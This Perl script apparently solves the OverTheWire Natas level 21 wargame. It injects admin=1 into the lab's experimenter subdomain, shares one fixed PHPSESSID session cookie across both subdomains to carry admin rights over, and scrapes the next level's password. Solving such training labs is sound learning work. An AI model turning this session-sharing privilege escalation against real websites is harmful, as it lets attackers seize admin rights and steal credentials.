#!/bin/perl
use LWP::Simple;
use HTML::Parse;
use HTTP::Request;
use HTTP::Response;
use HTTP::Cookies;
use URI;
use v5.16.3;

my $user = 'natas21';
my $login = shift or die "Please provide the password as argument\n";
my $host = $user.'.natas.labs.overthewire.org';
my $host2 = $user.'-experimenter.natas.labs.overthewire.org';
my $uri = URI->new(sprintf("http://%s:%s@%s", $user, $login, $host));
my $uri2 = URI->new(sprintf("http://%s:%s@%s", $user, $login, $host2));
# Evil injection on experimental site
$uri2->query_form("submit"=>"submit", "admin" => 1);

my $ua = LWP::UserAgent->new;
# Enable Cookies
my $cookie_jar = HTTP::Cookies->new();
# Set the same session cookie for both sites
$cookie_jar->set_cookie( 0, "PHPSESSID", "HACKINGMAGIC", "/", $host2, 80, 1, 0, 500, 1);
$cookie_jar->set_cookie( 0, "PHPSESSID", "HACKINGMAGIC", "/", $host, 80, 1, 0, 500, 1);
$ua->cookie_jar( $cookie_jar );

# Make a request to the experimental site and thus make us admin
my $request = new HTTP::Request('GET' => $uri2);
$ua->request($request);
# Make a second request to the main site with the same session, now we can retrieve the credentials
my $request = new HTTP::Request('GET' => $uri);
my $response = $ua->request($request);
$_ = $ua->request($request)->content;
if (/Password: (.{32})/) {
  say "The password for natas22 is ".$1;
}
